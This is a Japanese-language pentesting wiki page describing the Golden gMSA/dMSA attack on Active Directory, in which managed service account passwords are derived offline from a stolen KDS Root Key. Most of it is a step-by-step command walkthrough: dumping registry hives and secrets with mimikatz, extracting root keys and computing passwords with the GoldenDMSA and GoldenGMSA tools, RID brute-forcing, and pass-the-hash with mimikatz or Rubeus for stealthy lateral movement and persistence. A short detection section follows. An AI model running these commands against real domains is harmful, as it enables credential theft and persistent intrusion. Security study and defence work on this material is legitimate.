# Golden gMSA/dMSA Attack (Managed Service Account パスワードの Offline Derivation)

{{#include ../../banners/hacktricks-training.md}}

## 概要

Windows Managed Service Account（MSA）は、パスワードを手動で管理せずにサービスを実行するために設計された特殊な principal です。
主に次の2種類があります。

1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` attribute で認可された複数の host 上で使用できます。
2. **dMSA** – delegated Managed Service Account – gMSA の後継（preview）であり、同じ cryptography に依存しつつ、より細かな delegation シナリオに対応します。

どちらの variant でも、**password は**通常の NT-hash のように各 Domain Controller（DC）上に保存されません。代わりに、各 DC は次の情報から現在の password を on-the-fly で derive できます。

* forest-wide の **KDS Root Key**（`KRBTGT\KDS`）– ランダムに生成された GUID 名の secret。`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container 配下で、すべての DC に replicate されます。
* 対象 account の **SID**。
* `msDS-ManagedPasswordId` attribute にある account ごとの **ManagedPasswordID**（GUID）。

Derivation は次のとおりです: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 最終的に **base64-encoded** され、`msDS-ManagedPassword` attribute に保存される 240 byte の blob。
通常の password 使用時、Kerberos traffic や domain interaction は必要ありません。member host は3つの input を知っている限り、password を locally derive できます。

## Golden gMSA / Golden dMSA Attack

attacker が3つの input すべてを **offline** で取得できれば、DC に再度アクセスすることなく、forest 内の **任意の gMSA/dMSA の current および future password** を compute できます。これにより、次のものを bypass できます:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals（事前に pre-compute 可能）

これは service account 向けの *Golden Ticket* に相当します。<sup>[[1]](#references)[[2]](#references)</sup>

### 前提条件

1. **1台の DC の forest-level compromise**（または Enterprise Admin）、もしくは forest 内のいずれかの DC に対する `SYSTEM` access。
2. service account を enumerate する能力（LDAP read / RID brute-force）。
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) または同等の code を実行するための .NET ≥ 4.7.2 x64 workstation。

### Golden gMSA / dMSA
#### Phase 1 – KDS Root Key の Extract

任意の DC から dump します（Volume Shadow Copy / raw SAM+SECURITY hives または remote secrets）:<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey`（GUID名）とラベル付けされたbase64文字列は、後の手順で必要になります。<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – gMSA / dMSA オブジェクトの列挙

少なくとも `sAMAccountName`、`objectSid`、`msDS-ManagedPasswordId` を取得します。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています。<sup>[[1]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### フェーズ 3 – Guess / Discover the ManagedPasswordID（欠落している場合）

一部の deployment では、ACL で保護された read から `msDS-ManagedPasswordId` が *strip* されます。
GUID は 128 ビットであるため、単純な bruteforce は現実的ではありません。しかし、

1. 最初の **32 ビット = アカウント作成時刻の Unix epoch**（分単位の精度）。
2. その後に 96 個のランダムビットが続きます。

したがって、**アカウントごとの狭い wordlist**（± 数時間）は現実的です。
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
このツールは候補パスワードを計算し、その base64 blob を実際の `msDS-ManagedPassword` 属性と比較します。一致することで、正しい GUID が判明します。

##### フェーズ 4 – Offline Password Computation & Conversion

ManagedPasswordID が判明すれば、有効なパスワードは 1 つの command で取得できます:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
生成されたハッシュは **mimikatz**（`sekurlsa::pth`）または Kerberos abuse 用の **Rubeus** で注入でき、ステルス性の高い **lateral movement** と **persistence** が可能になります。

## Detection & Mitigation

* **DC backup and registry hive read** の機能を Tier-0 管理者に限定する。
* DC 上での **Directory Services Restore Mode (DSRM)** または **Volume Shadow Copy** の作成を監視する。
* `CN=Master Root Keys,…` の読み取り / 変更、およびサービスアカウントの `userAccountControl` フラグを監査する。
* 通常とは異なる **base64 password writes**、またはホスト間でのサービスパスワードの突然の再利用を検出する。
* Tier-0 isolation が不可能な場合は、高権限 gMSA を **classic service accounts** に変換し、定期的にランダムなパスワードをローテーションすることを検討する。

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – このページで使用している reference implementation。<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – このページで使用している reference implementation。
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`、`sekurlsa::pth`、`kerberos::ptt`。
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – 派生した AES keys を使用した pass-the-ticket。

## References

- [1] [Golden dMSA – delegated Managed Service Accounts の authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
